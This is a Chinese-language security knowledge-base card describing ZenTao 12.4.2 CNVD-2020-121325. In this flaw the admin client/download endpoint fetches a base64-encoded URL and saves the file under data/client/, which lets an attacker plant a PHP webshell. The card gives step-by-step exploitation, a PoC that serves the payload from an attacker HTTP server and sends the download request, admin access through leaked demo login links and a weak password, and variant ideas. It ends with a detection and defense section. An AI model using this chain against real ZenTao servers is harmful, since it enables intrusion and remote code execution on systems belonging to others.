---
id: web-php-rce-zentao-cnvd-2020-121325-link-download-webshell
title: 禅道 12.4.2 CNVD-2020-121325：client/download 的 link 参数 base64 任意 URL 下载，写入 data/client/ 落地 PHP webshell
type: scenario
domain: web
path: web/php/rce
technique: zentao-client-download-link-arbitrary-url-webshell
tags:
- php
- zentao
- cms
- arbitrary-file-download
- webshell
- rce
- cnvd
cve: []
severity: critical
confidence: high
affected_versions: 禅道 12.4.2（原文环境；CNVD-2020-121325 影响版本以公告为准）
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V277
  verified_at: '2026-11-07T23:36:33+08:00'
  notes: 已对照原文与49张图：m=client&f=download&version=1&link=base64(HTTP://10.0.20.30:8000/1.php) 返回保存成功，data/client/1/1.php 蚁剑连接成功；登录页 demo 自动登录链接与 admin/Admin123 权限提升过程与图24-30一致；CNVD-2020-121325 与禅道12.4.2标注正确。未在目标实测。
url: /docs/web/php/rce/web-php-rce-zentao-cnvd-2020-121325-link-download-webshell/
draft: false
kb_aliases:
- CNVD-2020-121325
- 禅道 12.4.2 文件下载 getshell
- index.php?m=client&f=download
- link 参数 base64
- data/client/1/1.php
---

## 一句话结论

禅道 12.4.2 的客户端下载接口 `/index.php?m=client&f=download&version=1&link=<base64(url)>` 把 `link` 解码后的 URL 交给服务端下载，导致攻击者可让禅道服务器从自己的 HTTP 服务拉取 PHP 脚本并写入 `data/client/<version>/<filename>`；访问该路径即执行 PHP（webshell），入口是后台或泄露的演示账号（本场景登录页源码嵌入 demo 账号自动登录链接，最终用 `admin/Admin123` 进入）。

## 原理

- **入口**：禅道客户端（client）模块的 `download` 方法用于下载客户端升级包，参数 `version` 指定版本目录，`link` 为 base64 编码的下载 URL。
- **未校验 URL 与落盘路径**：服务端 base64 解码 `link` 后直接请求该 URL，把响应保存到 `data/client/<version>/<basename>`；未限制协议/域名，也未校验下载内容类型。攻击者令 `link=base64("HTTP://attacker:8000/1.php")`，服务器下载 `1.php` 并保存为 `data/client/1/1.php`。
- **Web 可达**：`data/client/` 位于禅道 Web 根目录下可直接访问，保存的 `.php` 文件被 PHP 解析，形成任意代码执行；本场景用蚁剑连接 `http://target:7777/data/client/1/1.php` 成功。
- **权限点**：该功能需要管理员权限；本场景先通过登录页源码泄露的 demo 账号链接登录（页面源码含 `account=productManager&password=<md5>` 的自动登录 href），productManager 访问下载功能被拒（提示"访问受限"），随后用 `admin/Admin123` 管理员会话完成下载。
- **CNVD-2020-121325** 即该 `link` 参数可控导致的远程下载/任意文件写入问题；原文以 12.4.2 专业版验证。

## 触发条件

- 目标为禅道（原文 12.4.2），暴露 `/index.php?m=client&f=download`。
- 攻击者拥有管理员会话（弱口令、demo 自动登录链接、会话劫持等）；普通账号可能被权限校验拦截。
- 目标能出网访问攻击者 HTTP 服务，且 `data/client/` 目录可写并处于 Web 根内。
- 下载功能未对 `link` 做协议/域名白名单，未对文件名/内容做校验。

## 利用步骤

1. 访问禅道登录页，查看源码：本场景 footer 的 demo 账号链接含 `account=productManager&password=b2af...`、`account=projectManager&password=b2af...`，可直接登录低权限账号。
2. 尝试后台弱口令/默认口令；本场景用 `admin/Admin123` 获得管理员。
3. 攻击机准备 `1.php`（一句话/phpinfo）并起 HTTP 服务：`python3 -m http.server 8000`。
4. 构造 `link = base64("HTTP://ATTACKER:8000/1.php")`（原文 `SFRUUDovLzEwLjAuMjAuMzA6ODAwMC8xLnBocA==`），请求：
   `GET /index.php?m=client&f=download&version=1&link=<base64>`，页面返回"保存成功"。
5. 访问 `http://target/data/client/1/1.php`，确认 PHP 执行，用蚁剑连接。
6. 若目标端口经 4dnat/端口转发暴露，按实际映射地址访问。

## PoC

```text
# 攻击机
echo '<?php phpinfo(); ?>' > 1.php
python3 -m http.server 8000

# base64(HTTP://10.0.20.30:8000/1.php)
SFRUUDovLzEwLjAuMjAuMzA6ODAwMC8xLnBocA==
```

```http
GET /index.php?m=client&f=download&version=1&link=SFRUUDovLzEwLjAuMjAuMzA6ODAwMC8xLnBocA== HTTP/1.1
Host: target:7777
Cookie: <admin session>
```

```text
响应：保存成功
访问：http://target:7777/data/client/1/1.php
```

## 变体与关联

- `version` 参数控制落盘子目录，可改成其它数字/路径尝试覆盖或穿越；文件名取 URL basename，可构造 `.php` 后缀。
- 若目标不出网，可把 `link` 指向内网可达的 HTTP/文件服务，或先用其它上传点落地 PHP 再让禅道下载。
- 登录页 demo 账号自动登录链接属于额外信息泄露；即使没有管理员口令，也可先从低权限账号开始横向。
- 关联：禅道其它后台 RCE/文件操作卡（importMiniProgram zip 解压、backup/editor 路径穿越删除）；CNVD-2020-121325 与本文同源。

## 检测与防御

- `link` 参数必须协议/域名白名单，禁止 `http(s)` 以外协议与内网地址；下载内容按 MIME/扩展名/哈希校验。
- 下载目录设在 Web 根之外，或禁止该目录解析 PHP；对 `data/client/` 做访问控制。
- 删除登录页中的 demo 自动登录链接与明文/可复用口令哈希；后台强口令、限制下载功能权限。
- 监控 `data/client/` 新增 PHP 文件、`m=client&f=download` 请求中的 base64 `link` 与外部下载行为。
